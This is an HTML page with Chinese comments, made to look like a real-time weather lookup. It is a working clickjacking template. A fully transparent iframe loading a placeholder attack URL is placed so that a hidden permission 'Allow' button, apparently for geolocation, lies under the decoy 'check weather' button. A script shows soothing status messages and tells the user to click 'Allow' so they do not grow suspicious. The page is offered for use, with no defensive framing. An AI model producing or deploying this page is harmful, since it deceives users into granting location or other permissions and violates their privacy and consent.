<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>即時天氣預報</title>
<style>
    /* 原有的精美 CSS 樣式保持不變... */
    body { font-family: Arial; text-align: center; padding-top: 80px; background: #4fc3f7; overflow: hidden; }
    .weather-box { background: white; width: 320px; margin: auto; padding: 25px; border-radius: 20px; position: relative; z-index: 1; }
    
    /* 核心：點擊挾持容器 */
    .cj-container {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        z-index: 100; /* 確保在最上層 */
    }

    /* 隱形的攻擊層 (iframe) */
    .hidden-iframe {
        position: absolute;
        width: 1000px; /* 寬度設大，方便定位按鈕 */
        height: 1000px;
        opacity: 0;     /* 完全透明，使用者看不見 */
        filter: alpha(opacity=0);
        cursor: pointer;
    }
</style>
</head>
<body>

<div class="weather-box">
    <div class="sun"></div>
    <h2>🌤 即時天氣查詢</h2>
    <p>點擊按鈕查看目前天氣</p>
    <!-- 使用者「以為」他在點這個按鈕 -->
    <button id="fake-btn">查看天氣</button>
    <p id="status"></p>
</div>

<!-- 點擊挾持層 -->
<div class="cj-container">
    <!-- 這個 iframe 會載入一個會觸發定位請求的網頁（例如你原本的網頁） -->
    <!-- 透過調整 top 和 left，讓「允許」按鈕剛好疊在 fake-btn 上方 -->
    <iframe src="YOUR_ATTACK_PAGE_URL" class="hidden-iframe" style="top: -150px; left: -200px;"></iframe>
</div>

<script>
    // 當使用者點擊到透明層後，誘餌按鈕也需要做出反應，避免懷疑
    document.querySelector('.cj-container').addEventListener('click', function() {
        document.getElementById("status").innerHTML = "正在通訊中...";
        setTimeout(() => {
            document.getElementById("status").innerHTML = "請在上方彈窗點擊「允許」以利定位";
        }, 500);
    });
</script>

</body>
</html>
